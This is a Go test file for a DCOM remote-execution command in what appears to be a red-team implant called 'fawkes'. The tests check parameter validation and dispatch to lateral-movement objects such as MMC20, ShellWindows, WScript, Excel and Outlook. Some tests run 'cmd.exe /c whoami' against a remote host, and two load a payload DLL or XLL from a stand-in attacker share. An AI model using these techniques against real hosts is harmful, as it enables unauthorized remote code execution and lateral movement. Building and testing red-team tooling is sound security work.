//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"strings"
	"testing"

	"fawkes/pkg/structs"
)

func TestDcomNameAndDescription(t *testing.T) {
	cmd := &DcomCommand{}
	if cmd.Name() != "dcom" {
		t.Errorf("Expected name 'dcom', got '%s'", cmd.Name())
	}
	if cmd.Description() == "" {
		t.Error("Description should not be empty")
	}
}

func TestDcomInvalidJSON(t *testing.T) {
	cmd := &DcomCommand{}
	task := structs.Task{Params: "not json"}
	result := cmd.Execute(task)
	if result.Status != "error" {
		t.Error("Expected error status for invalid JSON")
	}
	if !strings.Contains(result.Output, "Error parsing parameters") {
		t.Errorf("Expected parsing error, got: %s", result.Output)
	}
}

func TestDcomEmptyParams(t *testing.T) {
	cmd := &DcomCommand{}
	task := structs.Task{Params: ""}
	result := cmd.Execute(task)
	if result.Status != "error" {
		t.Error("Expected error for empty params")
	}
	if !strings.Contains(result.Output, "parameters required") {
		t.Errorf("Expected parameters required error, got: %s", result.Output)
	}
}

func TestDcomUnknownAction(t *testing.T) {
	cmd := &DcomCommand{}
	params, _ := json.Marshal(map[string]string{"action": "nonexistent"})
	task := structs.Task{Params: string(params)}
	result := cmd.Execute(task)
	if result.Status != "error" {
		t.Error("Expected error for unknown action")
	}
	if !strings.Contains(result.Output, "Unknown action") {
		t.Errorf("Expected unknown action error, got: %s", result.Output)
	}
}

func TestDcomExecMissingHost(t *testing.T) {
	cmd := &DcomCommand{}
	params, _ := json.Marshal(map[string]string{"action": "exec", "command": "cmd.exe"})
	task := structs.Task{Params: string(params)}
	result := cmd.Execute(task)
	if result.Status != "error" {
		t.Error("Expected error for exec without host")
	}
	if !strings.Contains(result.Output, "host is required") {
		t.Errorf("Expected host required error, got: %s", result.Output)
	}
}

func TestDcomExecMissingCommand(t *testing.T) {
	cmd := &DcomCommand{}
	params, _ := json.Marshal(map[string]string{"action": "exec", "host": "192.168.1.1"})
	task := structs.Task{Params: string(params)}
	result := cmd.Execute(task)
	if result.Status != "error" {
		t.Error("Expected error for exec without command")
	}
	if !strings.Contains(result.Output, "command is required") {
		t.Errorf("Expected command required error, got: %s", result.Output)
	}
}

func TestDcomExecUnknownObject(t *testing.T) {
	cmd := &DcomCommand{}
	params, _ := json.Marshal(map[string]string{
		"action": "exec", "host": "192.168.1.1", "command": "cmd.exe", "object": "invalid",
	})
	task := structs.Task{Params: string(params)}
	result := cmd.Execute(task)
	if result.Status != "error" {
		t.Error("Expected error for unknown DCOM object")
	}
	if !strings.Contains(result.Output, "Unknown DCOM object") {
		t.Errorf("Expected unknown DCOM object error, got: %s", result.Output)
	}
	// Verify all valid objects are listed in error message
	for _, obj := range []string{"mmc20", "shellwindows", "shellbrowser", "wscript", "excel", "outlook"} {
		if !strings.Contains(result.Output, obj) {
			t.Errorf("Error message should list %q as available object", obj)
		}
	}
}

func TestDcomActionNormalization(t *testing.T) {
	cmd := &DcomCommand{}
	// Test uppercase action
	params, _ := json.Marshal(map[string]string{"action": "EXEC", "host": "192.168.1.1", "command": "cmd.exe"})
	task := structs.Task{Params: string(params)}
	result := cmd.Execute(task)
	// Should not fail with "Unknown action" — the actual DCOM call will fail since no remote host
	if strings.Contains(result.Output, "Unknown action") {
		t.Error("Action should be case-insensitive")
	}
}

func TestDcomCLSIDConstants(t *testing.T) {
	// Verify CLSIDs are set (not nil)
	if clsidMMC20 == nil {
		t.Error("MMC20.Application CLSID should not be nil")
	}
	if clsidShellWindows == nil {
		t.Error("ShellWindows CLSID should not be nil")
	}
	if clsidShellBrowserWd == nil {
		t.Error("ShellBrowserWindow CLSID should not be nil")
	}
}

func TestDcomDefaultObject(t *testing.T) {
	cmd := &DcomCommand{}
	// Exec without specifying object should default to mmc20
	params, _ := json.Marshal(map[string]string{
		"action": "exec", "host": "192.168.1.1", "command": "cmd.exe",
	})
	task := structs.Task{Params: string(params)}
	result := cmd.Execute(task)
	// Should not fail with "Unknown DCOM object" — the actual DCOM call will fail since no remote host
	if strings.Contains(result.Output, "Unknown DCOM object") {
		t.Error("Should default to mmc20 when object not specified")
	}
}

func TestDcomWScriptDispatch(t *testing.T) {
	cmd := &DcomCommand{}
	params, _ := json.Marshal(map[string]string{
		"action": "exec", "host": "192.168.1.1", "command": "cmd.exe", "args": "/c whoami", "object": "wscript",
	})
	task := structs.Task{Params: string(params)}
	result := cmd.Execute(task)
	// Should not fail with "Unknown DCOM object" — dispatches to wscript handler
	if strings.Contains(result.Output, "Unknown DCOM object") {
		t.Error("wscript should be a recognized DCOM object")
	}
	// Should fail with CoCreateInstanceEx (no remote host) not "Unknown"
	if strings.Contains(result.Output, "Unknown action") {
		t.Error("Should reach wscript handler, not unknown action")
	}
}

func TestDcomExcelDispatch(t *testing.T) {
	cmd := &DcomCommand{}
	params, _ := json.Marshal(map[string]string{
		"action": "exec", "host": "192.168.1.1", "command": "cmd.exe", "object": "excel",
	})
	task := structs.Task{Params: string(params)}
	result := cmd.Execute(task)
	// Should not fail with "Unknown DCOM object"
	if strings.Contains(result.Output, "Unknown DCOM object") {
		t.Error("excel should be a recognized DCOM object")
	}
}

func TestDcomExcelRegisterXLLDetection(t *testing.T) {
	cmd := &DcomCommand{}
	// Command ending in .xll should trigger RegisterXLL path
	params, _ := json.Marshal(map[string]string{
		"action": "exec", "host": "192.168.1.1", "command": "\\\\attacker\\share\\payload.xll", "object": "excel",
	})
	task := structs.Task{Params: string(params)}
	result := cmd.Execute(task)
	// Will fail on CoCreateInstanceEx but should reach Excel handler
	if strings.Contains(result.Output, "Unknown DCOM object") {
		t.Error("excel should be recognized")
	}
}

func TestDcomExcelDLLDetection(t *testing.T) {
	cmd := &DcomCommand{}
	// Command ending in .dll should also trigger RegisterXLL path
	params, _ := json.Marshal(map[string]string{
		"action": "exec", "host": "192.168.1.1", "command": "\\\\attacker\\share\\payload.dll", "object": "excel",
	})
	task := structs.Task{Params: string(params)}
	result := cmd.Execute(task)
	if strings.Contains(result.Output, "Unknown DCOM object") {
		t.Error("excel should be recognized")
	}
}

func TestDcomCLSIDConstantsExpanded(t *testing.T) {
	if clsidWScriptShell == nil {
		t.Error("WScript.Shell CLSID should not be nil")
	}
	if clsidExcelApp == nil {
		t.Error("Excel.Application CLSID should not be nil")
	}
	if clsidOutlookApp == nil {
		t.Error("Outlook.Application CLSID should not be nil")
	}
}

func TestDcomOutlookDispatch(t *testing.T) {
	cmd := &DcomCommand{}
	params, _ := json.Marshal(map[string]string{
		"action": "exec", "host": "192.168.1.1", "command": "cmd.exe", "args": "/c whoami", "object": "outlook",
	})
	task := structs.Task{Params: string(params)}
	result := cmd.Execute(task)
	// Should not fail with "Unknown DCOM object" — dispatches to outlook handler
	if strings.Contains(result.Output, "Unknown DCOM object") {
		t.Error("outlook should be a recognized DCOM object")
	}
	// Should fail with CoCreateInstanceEx (no remote host) not "Unknown"
	if strings.Contains(result.Output, "Unknown action") {
		t.Error("Should reach outlook handler, not unknown action")
	}
}

func TestDcomOutlookRequiresOutlook(t *testing.T) {
	cmd := &DcomCommand{}
	params, _ := json.Marshal(map[string]string{
		"action": "exec", "host": "192.168.1.1", "command": "cmd.exe", "object": "outlook",
	})
	task := structs.Task{Params: string(params)}
	result := cmd.Execute(task)
	// The error should mention Outlook installation requirement
	if result.Status == "success" {
		t.Error("Should fail without remote host connectivity")
	}
}
